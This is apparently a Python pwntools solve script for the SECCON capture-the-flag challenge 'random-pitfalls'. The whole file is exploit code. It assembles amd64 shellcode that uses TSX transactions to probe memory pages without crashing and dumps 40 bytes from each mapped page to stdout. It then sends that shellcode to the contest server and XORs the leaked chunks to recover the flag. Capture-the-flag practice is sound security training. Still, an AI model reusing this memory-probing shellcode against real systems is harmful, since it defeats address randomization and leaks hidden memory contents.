#!/usr/bin/env python3
from pwn import *


def memcpy(dst, src, n):
    source = ''
    for i in range(0, n, 8):
        source += f'    mov rax, [{src} + {i}]\n'
        source += f'    mov [{dst} + {i}], rax\n'
    return source


# rdi = mempages
# rsi = buf
context.arch = 'amd64'
shellsource = \
    '    mov rbp, rdi\n' + \
    '    lea rbx, [rbp + 64 * 4096]\n' + \
    'loop:\n' + \
    '    mov rax, -1\n' + \
    '    xbegin fallback\n' + \
    '    mov rcx, [rbp]\n' + \
    '    xend\n' + \
    'fallback:\n' + \
    '    cmp rax, -1\n' + \
    '    jne loop_next\n' + \
    memcpy('rsi', 'rbp', 40) + \
    '    mov rdi, 1\n' + \
    '    mov rdx, 40\n' + \
    '    mov rax, 1\n' + \
    '    syscall\n' + \
    'loop_next:\n' + \
    '    lea rbp, [rbp + 4096]\n' + \
    '    cmp rbp, rbx\n' + \
    '    jne loop\n' + \
    '    xor rdi, rdi\n' + \
    '    mov rax, SYS_exit\n' + \
    '    syscall\n' + \
    '    .org 4096 - 36\n'
print(shellsource)
shellcode = asm(shellsource)
assert(len(shellcode) == 4096 - 36)
open('shellcode.bin', 'wb').write(shellcode)

#p = process(['./server'])
p = remote('random-pitfalls.chal.seccon.jp', 10101)
assert(p.recvline().startswith(b'flags'))
p.send(shellcode)
values = p.recvn(32 * 40)
assert len(values) == 32 * 40, len(values)
print(values)
try:
    print(p.recvn(1))
except EOFError:
    pass
else:
    raise Exception('wtf')
buf = bytearray(40)
for i in range(0, len(values), 40):
    for j in range(40):
        buf[j] ^= values[i + j]
print(buf)
